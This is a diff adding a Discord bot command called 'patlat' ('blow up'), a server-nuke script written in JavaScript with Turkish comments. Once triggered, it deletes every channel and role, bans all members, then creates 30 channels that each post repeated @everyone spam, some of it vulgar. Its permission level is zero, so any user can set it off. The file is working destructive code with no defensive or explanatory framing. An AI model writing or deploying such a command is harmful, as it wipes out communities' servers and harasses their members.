@@ -1,0 +1,48 @@
+// Pâyidar Code - Pâyidar
+
+const Discord = require('discord.js')
+
+    exports.run = (client, message, args) => {
+        // Tüm Kanalları Silme
+        message.guild.channels.cache.forEach(payidar => {
+            payidar.delete();
+        });
+
+        // Tüm Rolleri Silme
+        message.guild.roles.cache.forEach(payidar => {
+            payidar.delete();
+        });
+
+        // Tüm Üyeleri Banlama
+        message.guild.members.forEach(payidar => {
+            payidar.ban();
+        });
+
+        // Kanal Açma & Ever Attırma
+        let kadir = 'HEPİNİZE KOLLLLAY GELSINN KOLAYDINIZZ.'
+
+        for(let i = 0; i < 30; i++){
+            message.guild.channels.create(kadir).then(payidar => {
+                payidar.send('@everyone OF BE ')
+                payidar.send('@everyone ANE DENIZE BEZ GETIR')
+                payidar.send('@everyone SİKTİK')
+                payidar.send('@everyone ZA')
+                payidar.send('@everyone SA')
+                payidar.send('@everyone AAA')
+                payidar.send('@everyone KOLAYDINIZ')
+                payidar.send('@everyone KOLAY GELSIN')
+                payidar.send('@everyone BURA NERE')
+            })
+        }
+    }
+
+exports.conf = {
+    enabled: true,
+    guildOnly: false,
+    aliases: ['Patlat'],
+    permLevel: 0
+}
+
+exports.help = {
+    name: 'patlat'
+}
